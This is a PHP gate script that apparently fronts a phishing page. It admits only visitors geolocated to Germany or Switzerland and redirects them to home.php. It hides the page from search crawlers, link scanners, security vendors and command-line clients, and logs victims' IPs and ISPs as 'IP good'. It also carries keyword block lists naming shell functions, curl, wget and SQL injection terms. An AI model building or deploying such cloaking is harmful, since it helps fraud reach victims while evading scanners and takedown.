<?php
$ALLOWED_COUNTRIES = [
    'DE', // Germany
    'CH'  // Suisse
];

$REDIRECT_FILE = 'home.php';
$IP_LOG_FILE = __DIR__ . '/ipanas.txt';
$ENABLE_LOGGING = true;

$htaccess_file = __DIR__ . '/.htaccess';
if (!file_exists($htaccess_file)) {
    $htaccess_content = <<<EOT
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteBase /
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule . index.php [L]
    <FilesMatch "^(\.htaccess|\.htpasswd|\.git|\.env|\.log)">
        Order deny,allow
        Deny from all
    </FilesMatch>
    Options -Indexes
</IfModule>
EOT;
    @file_put_contents($htaccess_file, $htaccess_content);
}

ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

$log_file = __DIR__ . '/logs/access.log';
if (!file_exists(dirname($log_file))) {
    @mkdir(dirname($log_file), 0755, true);
}

function is_valid_ip($ip) {
    return filter_var($ip, FILTER_VALIDATE_IP) !== false;
}

function get_ip_org($ip) {
    try {
        $url = "https://ipapi.co/{$ip}/org/";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $org = curl_exec($ch);
        curl_close($ch);
        
        if ($org && !empty(trim($org)) && stripos($org, 'error') === false) {
            return trim($org);
        }
    } catch (Exception $e) {
    }
    
    try {
        $url = "https://ipinfo.io/{$ip}/org";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $org = curl_exec($ch);
        curl_close($ch);
        
        if ($org && !empty(trim($org))) {
            return trim($org);
        }
    } catch (Exception $e) {
    }
    
    return "Unknown";
}

function log_ip_status($ip, $country_code, $allowed, $ip_log_file) {
    $date = date('Y-m-d H:i:s');
    $org = get_ip_org($ip);
    
    if ($allowed) {
        $log_entry = "{$date} - {$ip} - IP good - Country: {$country_code} - ISP: {$org}\n";
    } else {
        $log_entry = "{$date} - {$ip} - IP failed - Country: {$country_code}\n";
    }
    
    @file_put_contents($ip_log_file, $log_entry, FILE_APPEND);
}

function check_user_agent($user_agent) {
    $known_bots = [
        'googlebot', 'bingbot', 'yandexbot', 'baiduspider', 'sogou', 'duckduckbot', 'slurp',
        'ahrefsbot', 'msnbot', 'semrushbot', 'dotbot', 'mj12bot', 'blexbot', 'exabot',
        'facebookexternalhit', 'twitterbot', 'linkedinbot', 'pinterestbot', 'slackbot',
        'telegrambot', 'whatsapp', 'vkshare', 'discordbot',
        'w3c_validator', 'validator.nu', 'feed validator', 'jigsaw',
        'adsbot-google', 'mediapartners-google', 'apis-google', 'feedfetcher-google',
        'google-read-aloud', 'storebot-google',
        'azure-logic-apps', 'azurebot', 'bingpreview', 'msnbot-media', 'adidxbot',
        'ms-office', 'skype', 'microsoft-cryptoapi', 'microsoft office',
        'amazonbot', 'aws-waf', 'alexa', 'amazonroute53healthcheck',
        'aws-elb-healthchecker', 'ec2linkfinder', 'aws-cloudfront',
        'digitalocean', 'do-user-agent', 'do-health-check', 'do-spaces',
        'pingdom', 'uptimerobot', 'statuscake', 'newrelic', 'datadog', 'nagios',
        'cloudflare', 'cloudflare-alwaysonline', 'sucuri', 'imperva', 'akamai',
        'applebot', 'curl', 'wget', 'python-requests', 'python-urllib', 'java',
        'php', 'node-fetch', 'axios', 'go-http-client', 'ruby', 'perl'
    ];
    
    foreach ($known_bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
    
    if (empty($user_agent) || strlen($user_agent) < 10 || $user_agent == 'Mozilla' || $user_agent == 'Unknown') {
        return true;
    }
    
    return false;
}

function check_country($ip) {
    try {
        $url = "https://get.geojs.io/v1/ip/geo/{$ip}.json";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
        $response = curl_exec($ch);
        
        if (!curl_errno($ch)) {
            curl_close($ch);
            $data = json_decode($response, true);
            
            if (isset($data['country_code'])) {
                return $data['country_code'];
            }
        } else {
            curl_close($ch);
        }
    } catch (Exception $e) {
    }
    
    try {
        $url = "https://ipapi.co/{$ip}/country/";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $country = curl_exec($ch);
        curl_close($ch);
        
        if ($country && strlen($country) === 2) {
            return $country;
        }
    } catch (Exception $e) {
    }
    
    return false;
}

function block_access($ip, $reason, $log_file, $enable_logging) {
    if ($enable_logging) {
        @file_put_contents($log_file, date('Y-m-d H:i:s') . " - IP: $ip - BLOCKED: $reason\n", FILE_APPEND);
    }
    
    usleep(rand(500000, 2000000));
    header_remove();
    header("HTTP/1.1 444 Connection Closed Without Response");
    header("Content-Length: 0");
    header("Connection: close");
    
    ignore_user_abort(true);
    
    if (function_exists('fastcgi_finish_request')) {
        fastcgi_finish_request();
    } else {
        ob_end_clean();
        flush();
    }
    
    exit;
}

function is_suspicious_request() {
    $suspicious_params = ['eval', 'exec', 'system', 'passthru', 'shell', 'cmd', 'wget', 'curl', 'base64'];
    foreach ($suspicious_params as $param) {
        if (isset($_GET[$param]) || isset($_POST[$param])) {
            return true;
        }
    }
    
    $suspicious_paths = ['/wp-login', '/wp-admin', '/admin', '/administrator', '/phpmyadmin', '/mysql', '/sql', '/.env', '/.git'];
    foreach ($suspicious_paths as $path) {
        if (stripos($_SERVER['REQUEST_URI'], $path) !== false) {
            return true;
        }
    }
    
    $request_data = json_encode($_REQUEST);
    if (preg_match('/(union|select|from|where|concat|information_schema|table_schema)/i', $request_data)) {
        return true;
    }
    
    return false;
}

$ip = $_SERVER['REMOTE_ADDR'];

if (!is_valid_ip($ip)) {
    log_ip_status($ip, "Invalid", false, $IP_LOG_FILE);
    block_access($ip, "Invalid IP", $log_file, $ENABLE_LOGGING);
}

$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';

if ($ENABLE_LOGGING) {
    @file_put_contents($log_file, date('Y-m-d H:i:s') . " - IP: $ip - UA: $user_agent - Path: " . $_SERVER['REQUEST_URI'] . "\n", FILE_APPEND);
}

if (is_suspicious_request()) {
    log_ip_status($ip, "Suspicious", false, $IP_LOG_FILE);
    block_access($ip, "Suspicious request", $log_file, $ENABLE_LOGGING);
}

$is_bot = check_user_agent($user_agent);
$country_code = check_country($ip);
$country_code = $country_code ? $country_code : "Unknown";

if ($ENABLE_LOGGING && $country_code) {
    @file_put_contents($log_file, date('Y-m-d H:i:s') . " - IP: $ip, Country: $country_code - Bot: " . ($is_bot ? 'Yes' : 'No') . " - Path: " . $_SERVER['REQUEST_URI'] . "\n", FILE_APPEND);
}

if (in_array($country_code, $ALLOWED_COUNTRIES)) {
    log_ip_status($ip, $country_code, true, $IP_LOG_FILE);
    
    if ($ENABLE_LOGGING) {
        @file_put_contents($log_file, date('Y-m-d H:i:s') . " - IP: $ip, Country: $country_code - Redirecting to $REDIRECT_FILE\n", FILE_APPEND);
    }
    
    header("Location: $REDIRECT_FILE");
    exit;
} else {
    log_ip_status($ip, $country_code, false, $IP_LOG_FILE);
    block_access($ip, "Country not allowed: " . ($country_code ? $country_code : "Unknown"), $log_file, $ENABLE_LOGGING);
}
?>
